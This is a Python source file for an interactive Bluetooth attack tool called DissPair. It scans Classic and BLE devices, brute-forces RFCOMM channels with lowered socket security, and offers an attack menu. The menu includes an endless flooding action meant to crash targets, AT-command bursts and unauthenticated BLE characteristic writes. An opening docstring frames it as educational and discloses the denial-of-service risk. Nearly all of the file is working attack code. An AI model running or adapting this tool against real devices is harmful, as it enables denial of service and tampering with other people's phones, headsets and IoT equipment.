#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
import socket
import struct
import re
import shutil

"""⚠️Potentially Harmful Capabilities & Risk Disclosure

This tool is strictly intended for educational purposes, security research, and authorized security auditing. It contains features that can cause operational disruption to target hardware if used improperly:

1. RFCOMM Hardware Flooding: The "Flood" module intentionally injects dense byte streams into targeted Bluetooth channels. On vulnerable, legacy, or unpatched Bluetooth stacks, this can cause buffer overflows, resulting in the target device freezing, kernel panics, or complete Denial of Service (DoS).

2. Payload Injection & State Manipulation: The ability to inject raw AT commands (e.g., HFP manipulation) and OBEX payloads can alter the operational state of target devices, potentially causing unauthorized call manipulation or disrupting audio gateways.

3. GATT Interaction: Unauthenticated reading/writing of BLE characteristics may expose sensitive plaintext data or alter IoT device configurations.

The developer assumes no liability for misuse or damage caused by this software. Use exclusively on hardware you own or have explicit consent to audit."""

# --- DEPENDENCY CHECK ---
try:
    import asyncio
    from bleak import BleakScanner, BleakClient
    from bleak.exc import BleakError
    BLE_SUPPORT = True
except ImportError:
    BLE_SUPPORT = False
    print("\n[\033[93m!\033[0m] \033[93mBleak library is missing. BLE scanning will be disabled.\033[0m")
    print("    To enable BLE, run: pip install bleak --break-system-packages\n")
    time.sleep(2)

# --- COLORS ---
C = "\033[96m"  # Cyan
R = "\033[91m"  # Red
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
D = "\033[90m"  # Dark Gray
W = "\033[0m"   # White/Reset
M = "\033[95m"  # Magenta

# --- NATIVE LINUX BLUETOOTH CONSTANTS ---
# Standard Python sockets support AF_BLUETOOTH natively on Linux!
SOL_BLUETOOTH = getattr(socket, 'SOL_BLUETOOTH', 274)
BT_SECURITY = 4
BT_SECURITY_LOW = 1  # No encryption, No authentication

class DissPairCLI:
    def __init__(self):
        self.devices = []
        self.target_mac = None
        self.target_name = None
        
        # State Arrays
        self.open_channels = []  # For Classic RFCOMM
        self.ble_chars = []      # For BLE GATT
        
        self.payload_size = 2048

    def clear(self):
        os.system('clear')

    def banner(self):
        self.clear()
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f" {C}█▀▀▄ █ ▄▀▀ ▄▀▀   {R}█▀▀▄ ▄▀▄ █ █▀▀▄{W}")
        print(f" {C}█  █ █ ▀▀▄ ▀▀▄ {D}━━{R} █▄▄▀ █▀█ █ █▄▄▀{W}   {D}| CLI EDITION{W}")
        print(f" {C}▀▀▀  ▀ ▀▀  ▀▀    {R}█    ▀ ▀ ▀ ▀  ▀▄{W}  {D} | v1.0{W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")

    def input_prompt(self, text):
        return input(f"{C}Diss{R}Pair{W} > {text}")

    def get_rfcomm_socket(self):
        # Native Linux Bluetooth socket (No PyBluez required!)
        return socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)

    # ─── SCANNING ─────────────────────────────────────────────────────────────

    def scan_classic(self):
        print(f"[{C}*{W}] Initializing Classic BR/EDR Discovery (10-15 seconds)...")
        try:
            initial_count = len(self.devices)
            
            # Prefer hcitool as it strictly scans Classic (BR/EDR) and ignores BLE beacons
            if shutil.which('hcitool'):
                print(f"{D}    Running strict BR/EDR scan (hcitool)...{W}")
                res = subprocess.run(['hcitool', 'scan', '--flush'], capture_output=True, text=True)
                lines = res.stdout.strip().split('\n')
                for line in lines:
                    match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line)
                    if match:
                        mac = match.group(1).upper()
                        name = line.split(match.group(1), 1)[-1].strip()
                        self._add_device(mac, name or "Unknown", "Classic")
            else:
                print(f"{D}    Running native BlueZ scan (fallback)...{W}")
                subprocess.run(['bluetoothctl', '--timeout', '10', 'scan', 'on'], capture_output=True)
                res = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
                lines = res.stdout.strip().split('\n')
                for line in lines:
                    match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line)
                    if match:
                        mac = match.group(1).upper()
                        name = line.split(match.group(1), 1)[-1].strip()
                        # Clean up async ble garbage text if present
                        name = name.replace('Device', '').replace('RSSI is nil', '').strip()
                        self._add_device(mac, name or "Unknown", "Classic")

            new_count = len(self.devices) - initial_count
            print(f"[{G}+{W}] Scan complete. Added {new_count} classic devices.")
        except Exception as e:
            print(f"[{R}-{W}] Classic scan failed: {e}")
            print(f"    Check if Bluetooth is unblocked: 'sudo rfkill unblock bluetooth'")
        time.sleep(2)

    async def _scan_ble_async(self):
        print(f"[{C}*{W}] Initializing BLE Passive Radar (5 seconds)...")
        try:
            devices = await BleakScanner.discover(timeout=5.0)
            for d in devices:
                self._add_device(d.address, d.name or "Unknown", "BLE")
            print(f"[{G}+{W}] BLE radar complete.")
        except Exception as e:
            print(f"[{R}-{W}] BLE scan failed: {e}")

    def scan_ble(self):
        if not BLE_SUPPORT:
            print(f"[{R}!{W}] Bleak library missing. Cannot scan BLE.")
            print(f"    Run: pip install bleak --break-system-packages")
            time.sleep(2)
            return
        asyncio.run(self._scan_ble_async())
        time.sleep(2)

    def list_paired(self):
        print(f"[{C}*{W}] Fetching local paired devices from BlueZ...")
        try:
            res = subprocess.run(['bluetoothctl', 'devices', 'Paired'], capture_output=True, text=True)
            lines = res.stdout.strip().split('\n')
            count = 0
            for line in lines:
                match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line)
                if match:
                    mac = match.group(1).upper()
                    name = line.split(match.group(1), 1)[-1].strip()
                    name = name.replace('Device', '').strip()
                    self._add_device(mac, name or "Unknown", "PAIRED")
                    count += 1
            print(f"[{G}+{W}] Found {count} paired devices.")
        except Exception as e:
            print(f"[{R}-{W}] Failed to fetch paired devices: {e}")
        time.sleep(2)

    def manual_target_entry(self):
        self.banner()
        print(f"[{C}*{W}] Manual Target Entry")
        print(f"    Enter the MAC Address of your target (Format: XX:XX:XX:XX:XX:XX)\n")
        
        mac = self.input_prompt("MAC Address: ").strip().upper()
        if len(mac) == 17 and mac.count(':') == 5:
            name = self.input_prompt("Optional Target Name: ").strip() or "Manual Target"
            is_ble = self.input_prompt("Is this a BLE device? (y/N): ").strip().lower()
            
            dtype = "BLE" if is_ble == 'y' else "MANUAL"
            self._add_device(mac, name, dtype)
            
            self.target_mac = mac
            self.target_name = name
            self.open_channels = []
            self.ble_chars = []
            print(f"\n[{G}+{W}] Target locked: {self.target_name} ({self.target_mac}) [{dtype}]")
        else:
            print(f"\n[{R}!{W}] Invalid MAC format. Must be XX:XX:XX:XX:XX:XX")
        time.sleep(2)

    def _add_device(self, mac, name, dtype):
        for d in self.devices:
            if d['mac'] == mac:
                return
        self.devices.append({'mac': mac, 'name': name, 'type': dtype})

    def select_target(self):
        if not self.devices:
            print(f"[{Y}!{W}] No devices in memory. Please scan or enter manually.")
            time.sleep(2)
            return

        self.banner()
        print(f"{D}{'ID':<4} | {'MAC ADDRESS':<18} | {'TYPE':<10} | {'NAME'}{W}")
        print("-" * 60)
        for idx, dev in enumerate(self.devices):
            t_color = C if dev['type'] == 'Classic' else M if dev['type'] == 'MANUAL' else R if dev['type'] == 'PAIRED' else G
            print(f"{idx:<4} | {dev['mac']:<18} | {t_color}{dev['type']:<10}{W} | {dev['name']}")
        
        try:
            print("")
            sel_input = self.input_prompt("Enter Target ID (or press Enter to cancel): ")
            if not sel_input.strip():
                return
                
            sel = int(sel_input)
            self.target_mac = self.devices[sel]['mac']
            self.target_name = self.devices[sel]['name']
            self.open_channels = [] 
            self.ble_chars = []
            print(f"[{G}+{W}] Target locked: {self.target_name} ({self.target_mac})")
            time.sleep(1)
        except (ValueError, IndexError):
            print(f"[{R}!{W}] Invalid selection.")
            time.sleep(1)

    # ─── CLASSIC RFCOMM ENUMERATION ───────────────────────────────────────────

    def enumerate_classic_target(self):
        self.banner()
        print(f"[{C}*{W}] Commencing RFCOMM Bruteforce on {self.target_mac}...")
        print(f"{D}    Bypassing SDP. Testing channels 1-30 sequentially.{W}\n")
        
        target_is_paired = False
        for d in self.devices:
            if d['mac'] == self.target_mac and d['type'] == 'PAIRED':
                target_is_paired = True
                break

        try:
            res = subprocess.run(['bluetoothctl', 'info', self.target_mac], capture_output=True, text=True)
            if "Paired: yes" in res.stdout:
                target_is_paired = True
        except: pass

        if target_is_paired:
            print(f"[{C}*{W}] Target is Paired. Releasing Kali's active audio sinks (A2DP/HFP)...")
            subprocess.run(['bluetoothctl', 'disconnect', self.target_mac], capture_output=True)
            time.sleep(2.0)

        self.open_channels = []
        last_os_error = None

        for ch in range(1, 31):
            sys.stdout.write(f"\r{D}    Probing Channel {ch}/30...{W}")
            sys.stdout.flush()
            
            is_open = False
            c_type = ""

            if target_is_paired:
                sock_sec = self.get_rfcomm_socket()
                sock_sec.settimeout(6.0)
                try:
                    sock_sec.connect((self.target_mac, ch))
                    is_open = True
                    c_type = "Paired"
                except Exception as e:
                    if not last_os_error: last_os_error = str(e)
                finally:
                    try: sock_sec.close() 
                    except: pass
            else:
                sock_insec = self.get_rfcomm_socket()
                sock_insec.settimeout(6.0) 
                
                try:
                    opt = struct.pack("BB", BT_SECURITY_LOW, 0)
                    if hasattr(sock_insec, 'setsockopt'):
                        sock_insec.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                    elif hasattr(sock_insec, '_sock') and hasattr(sock_insec._sock, 'setsockopt'):
                        sock_insec._sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                except Exception: pass

                try:
                    sock_insec.connect((self.target_mac, ch))
                    is_open = True
                    c_type = "Unpaired"
                except Exception as e:
                    if not last_os_error: last_os_error = str(e)
                finally:
                    try: sock_insec.close() 
                    except: pass

                if not is_open:
                    time.sleep(0.5)
                    sock_sec = self.get_rfcomm_socket()
                    sock_sec.settimeout(6.0)
                    try:
                        sock_sec.connect((self.target_mac, ch))
                        is_open = True
                        c_type = "Paired"
                    except Exception: pass
                    finally:
                        try: sock_sec.close() 
                        except: pass

            if is_open:
                self.open_channels.append({'ch': ch, 'type': c_type})
                sys.stdout.write(f"\r[{G}+{W}] Found open RFCOMM Channel: {ch} ({c_type})       \n")
                sys.stdout.flush()
            time.sleep(0.1)
                
        print(f"\n[{C}*{W}] Enumeration complete. Discovered {len(self.open_channels)} open channels.")
        if len(self.open_channels) == 0 and last_os_error:
            print(f"[{Y}!{W}] Diagnostic Info -> Kali Kernel reported: {last_os_error}")
        time.sleep(3)

    # ─── BLE GATT ENUMERATION ─────────────────────────────────────────────────

    async def _enumerate_ble_async(self):
        self.banner()
        print(f"[{C}*{W}] Commencing GATT Enumeration on {self.target_mac}...")
        print(f"{D}    Pulling Services and Characteristics without OS pairing...{W}\n")
        
        self.ble_chars = []
        try:
            async with BleakClient(self.target_mac, timeout=10.0) as client:
                print(f"[{G}+{W}] Successfully connected to {self.target_mac}")
                print(f"[{C}*{W}] Requesting GATT Table...\n")
                
                for service in client.services:
                    print(f"{M}=== Service: {service.uuid} ==={W}")
                    print(f"    Description: {service.description}")
                    for char in service.characteristics:
                        props = ", ".join(char.properties)
                        print(f"  {D}|--{W} Characteristic: {char.uuid}")
                        print(f"      Properties: {props}")
                        
                        self.ble_chars.append({
                            'uuid': char.uuid,
                            'props': char.properties,
                            'desc': char.description
                        })
                    print("")
                    
                print(f"[{G}+{W}] Discovered {len(self.ble_chars)} active characteristics.")
        except asyncio.TimeoutError:
            print(f"[{R}-{W}] Connection timed out. Device might be out of range.")
        except Exception as e:
            # On Kali Linux, BlueZ often throws a silent/blank DBus exception when 
            # the client disconnects at the end of the async with block.
            if len(self.ble_chars) == 0:
                print(f"[{R}-{W}] BLE Enumeration failed: {e}")
        self.input_prompt("Press ENTER to return...")

    def enumerate_ble_target(self):
        asyncio.run(self._enumerate_ble_async())

    # ─── CLASSIC RFCOMM ATTACK MENU ───────────────────────────────────────────

    def interact_classic(self):
        if not self.open_channels:
            print(f"[{Y}!{W}] No verified channels. Enumerate first.")
            time.sleep(2)
            return

        self.banner()
        print(f"[{C}*{W}] Verified Channels for {self.target_mac}:")
        for idx, item in enumerate(self.open_channels):
            print(f"    [{idx}] Channel {item['ch']}  ({item['type']})")
            
        try:
            print("")
            sel = int(self.input_prompt("Select Channel ID to interface: "))
            selected_item = self.open_channels[sel]
            ch = selected_item['ch']
            c_type = selected_item['type']
        except (ValueError, IndexError):
            print(f"[{R}!{W}] Invalid selection.")
            time.sleep(1)
            return

        while True:
            self.banner()
            print(f"    {C}TARGET:{W}  {self.target_name} ({self.target_mac})")
            print(f"    {C}CHANNEL:{W} {ch} [{c_type}]")
            print(f"    {C}PAYLOAD:{W} {self.payload_size} Bytes\n")
            
            print(f"    {D}[1]{W} {C}CONNECT{W}   (Silent verification)")
            print(f"    {D}[2]{W} {M}Linux TTY{W} (Simulate ModemManager AT Probes)")
            print(f"    {D}[3]{W} {R}FLOOD{W}     (Resource Exhaustion DoS)")
            print(f"    {D}[4]{W} Set Payload Size")
            print(f"    {D}[0]{W} Back to Main Menu\n")
            
            cmd = self.input_prompt("Action: ")

            if cmd == '1': self._action_connect(ch, c_type)
            elif cmd == '2': self._action_kali_sim(ch, c_type)
            elif cmd == '3': self._action_flood(ch, c_type)
            elif cmd == '4':
                try: self.payload_size = int(self.input_prompt("Enter size in bytes (e.g. 2048): "))
                except ValueError: pass
            elif cmd == '0': break

    def _create_attack_socket(self, c_type):
        sock = self.get_rfcomm_socket()
        sock.settimeout(6.0)
        if c_type == "Unpaired":
            try:
                opt = struct.pack("BB", BT_SECURITY_LOW, 0)
                if hasattr(sock, 'setsockopt'):
                    sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                elif hasattr(sock, '_sock') and hasattr(sock._sock, 'setsockopt'):
                    sock._sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
            except Exception: pass
        return sock

    def _action_connect(self, ch, c_type):
        print(f"\n[{C}*{W}] Establishing silent L2CAP/RFCOMM link to Ch {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Connection Verified. Socket is held open silently.")
            self.input_prompt("Press ENTER to drop the socket and return...")
        except Exception as e:
            print(f"[{R}-{W}] Connection refused: {e}")
            time.sleep(2)
        finally:
            try: sock.close()
            except: pass

    def _action_kali_sim(self, ch, c_type):
        print(f"\n[{M}*{W}] Simulating Linux TTY Modem noise on Ch {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Connected! Blasting Linux AT Modem probes...")
            kali_noise = [b"AT\r\n", b"ATZ\r\n", b"AT+CGMI\r\n", b"AT+CMEE=1\r\n", b"AT+GMM\r\n", b"AT+GMR\r\n"] * 10
            for probe in kali_noise:
                sock.send(probe)
                time.sleep(0.01)
            print(f"[{C}*{W}] Burst complete. Check if target restarted.")
            time.sleep(2)
        except Exception as e:
            print(f"[{R}-{W}] Target rejected connection: {e}")
            time.sleep(2)
        finally:
            try: sock.close()
            except: pass

    def _action_flood(self, ch, c_type):
        print(f"\n[{R}!!{W}] INITIATING RESOURCE EXHAUSTION FLOOD ON CH {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Socket locked. Pumping {self.payload_size}B chunks...")
            payload = b"X" * self.payload_size
            blocks_sent = 0
            try:
                while True:
                    sock.send(payload)
                    blocks_sent += 1
                    if blocks_sent % 10 == 0:
                        sys.stdout.write(f"\r{D}    [>] Sent {blocks_sent} blocks...{W}")
                        sys.stdout.flush()
                    time.sleep(0.01)
            except KeyboardInterrupt:
                print(f"\n[{Y}*{W}] Flood stopped by user. {blocks_sent} blocks sent.")
            except Exception:
                print(f"\n[{G}+{W}] Fuzzing Completed: Target crashed or connection dropped.")
        except Exception as e:
            print(f"[{R}-{W}] Connection failed before flood: {e}")
        finally:
            try: sock.close()
            except: pass
            self.input_prompt("Press ENTER to return...")

    # ─── BLE GATT INTERACTIVE MENU ────────────────────────────────────────────

    def interact_ble(self):
        if not self.ble_chars:
            print(f"[{Y}!{W}] No GATT characteristics in memory. Enumerate first.")
            time.sleep(2)
            return

        while True:
            self.banner()
            print(f"[{C}*{W}] Target GATT Characteristics:")
            for idx, c in enumerate(self.ble_chars):
                props = ", ".join(c['props'])
                print(f"    [{idx}] {c['uuid']} {D}({props}){W}")
            
            print("")
            sel = self.input_prompt("Select ID to interact (or press Enter to cancel): ")
            if not sel.strip(): return
            try:
                sel_idx = int(sel)
                char = self.ble_chars[sel_idx]
            except:
                print(f"[{R}!{W}] Invalid selection.")
                time.sleep(1)
                continue
            
            self._ble_action_menu(char)

    def _ble_action_menu(self, char):
        while True:
            self.banner()
            print(f"    {C}TARGET:{W} {self.target_name} ({self.target_mac})")
            print(f"    {C}CHAR:{W}   {char['uuid']}")
            print(f"    {C}DESC:{W}   {char['desc']}")
            print(f"    {C}PROPS:{W}  {', '.join(char['props'])}\n")
            
            print(f"    {D}[1]{W} Read Value")
            print(f"    {D}[2]{W} Write Value (String Text)")
            print(f"    {D}[3]{W} Write Value (Raw Hex)")
            print(f"    {D}[0]{W} Back\n")
            
            cmd = self.input_prompt("Action: ")
            
            if cmd == '0': break
            
            elif cmd == '1':
                if 'read' not in char['props']:
                    print(f"[{Y}!{W}] Characteristic does not advertise 'read' properties.")
                    time.sleep(1)
                    continue
                asyncio.run(self._ble_read_async(char['uuid']))
                
            elif cmd == '2':
                if 'write' not in char['props'] and 'write-without-response' not in char['props']:
                    print(f"[{Y}!{W}] Characteristic does not advertise 'write' properties.")
                    time.sleep(1)
                    continue
                val = self.input_prompt("Enter string to write: ")
                # Enforce response checking if the char supports it
                req_resp = 'write' in char['props']
                asyncio.run(self._ble_write_async(char['uuid'], val.encode('utf-8'), req_resp))
                
            elif cmd == '3':
                if 'write' not in char['props'] and 'write-without-response' not in char['props']:
                    print(f"[{Y}!{W}] Characteristic does not advertise 'write' properties.")
                    time.sleep(1)
                    continue
                val = self.input_prompt("Enter hex (e.g. 0A FF 00): ").replace(" ", "")
                try:
                    data = bytes.fromhex(val)
                    # Enforce response checking if the char supports it
                    req_resp = 'write' in char['props']
                    asyncio.run(self._ble_write_async(char['uuid'], data, req_resp))
                except ValueError:
                    print(f"[{R}!{W}] Invalid hex format. Please use valid hex pairs.")
                    time.sleep(2)

    async def _ble_read_async(self, uuid):
        print(f"\n[{C}*{W}] Connecting to read {uuid}...")
        success = False
        try:
            async with BleakClient(self.target_mac, timeout=10.0) as client:
                # Add a 0.5s stabilization delay to prevent immediate DBus teardown on older targets
                await asyncio.sleep(0.5)
                data = await client.read_gatt_char(uuid)
                print(f"[{G}+{W}] READ SUCCESS:")
                print(f"    Hex:   {data.hex()}")
                print(f"    ASCII: {repr(data)}")
                success = True
        except BleakError as e:
            error_msg = str(e).lower()
            if "authentication" in error_msg or "encryption" in error_msg or "not authorized" in error_msg:
                print(f"[{R}!{W}] SECURE -> Read Rejected (Authentication Required)")
            else:
                if not success:
                    e_str = str(e).strip() or "Device disconnected silently (BlueZ DBus error)."
                    print(f"[{R}-{W}] Read failed: {e_str}")
        except Exception as e:
            if not success:
                e_str = str(e).strip() or "Device disconnected silently (BlueZ DBus error)."
                print(f"[{R}-{W}] Read failed: {e_str}")
        self.input_prompt("Press ENTER to continue...")

    async def _ble_write_async(self, uuid, data, req_response):
        resp_type = "With Response" if req_response else "Without Response"
        print(f"\n[{C}*{W}] Connecting to write {len(data)} bytes to {uuid} ({resp_type})...")
        success = False
        try:
            async with BleakClient(self.target_mac, timeout=10.0) as client:
                # Add a 0.5s stabilization delay to prevent immediate DBus teardown on older targets
                await asyncio.sleep(0.5)
                await client.write_gatt_char(uuid, data, response=req_response)
                print(f"[{G}+{W}] WRITE SUCCESS! Data sent directly to characteristic.")
                success = True
        except BleakError as e:
            error_msg = str(e).lower()
            if "authentication" in error_msg or "encryption" in error_msg or "not authorized" in error_msg:
                print(f"[{R}!{W}] SECURE -> Write Rejected (Authentication Required)")
            else:
                if not success:
                    e_str = str(e).strip() or "Device disconnected silently (BlueZ DBus error)."
                    print(f"[{R}-{W}] Write failed: {e_str}")
        except Exception as e:
            if not success:
                e_str = str(e).strip() or "Device disconnected silently (BlueZ DBus error)."
                print(f"[{R}-{W}] Write failed: {e_str}")
        self.input_prompt("Press ENTER to continue...")

    # ─── MAIN LOOP ────────────────────────────────────────────────────────────

    def _get_target_type(self):
        if not self.target_mac: return None
        for d in self.devices:
            if d['mac'] == self.target_mac:
                return d['type']
        return "Classic"

    def run(self):
        while True:
            self.banner()
            
            t_str = f"{G}{self.target_name} ({self.target_mac}){W}" if self.target_mac else f"{D}None{W}"
            t_type = self._get_target_type()
            
            # Dynamic stats based on selected target
            enum_stat = f"{len(self.ble_chars)} GATT Chars" if t_type == "BLE" else f"{len(self.open_channels)} RFCOMM Ports"
            
            print(f"    {C}1.{W} Scan Classic BR/EDR")
            print(f"    {C}2.{W} Scan BLE (Passive Radar)")
            print(f"    {C}3.{W} Load Local Paired Devices")
            print(f"    {C}4.{W} Enter Target MAC Manually\n")
            
            print(f"    {C}5.{W} Select Target       [ Current: {t_str} ]")
            print(f"    {C}6.{W} Enumerate Target    [ {enum_stat} ]")
            print(f"    {C}7.{W} Open Attack Menu    (Interact with Target)\n")
            
            print(f"    {D}0.{W} Exit")
            
            cmd = self.input_prompt("Select Option: ")

            if cmd == '1':
                self.scan_classic()
                if self.devices: self.select_target()
            elif cmd == '2':
                self.scan_ble()
                if self.devices: self.select_target()
            elif cmd == '3':
                self.list_paired()
                if self.devices: self.select_target()
            elif cmd == '4':
                self.manual_target_entry()
            elif cmd == '5':
                self.select_target()
            elif cmd == '6':
                if not self.target_mac:
                    print(f"[{Y}!{W}] Select a target first.")
                    time.sleep(2)
                elif t_type == "BLE":
                    self.enumerate_ble_target()
                else:
                    self.enumerate_classic_target()
            elif cmd == '7':
                if not self.target_mac:
                    print(f"[{Y}!{W}] Select a target first.")
                    time.sleep(2)
                elif t_type == "BLE":
                    self.interact_ble()
                else:
                    self.interact_classic()
            elif cmd == '0':
                self.clear()
                sys.exit(0)

if __name__ == "__main__":
    try:
        cli = DissPairCLI()
        cli.run()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
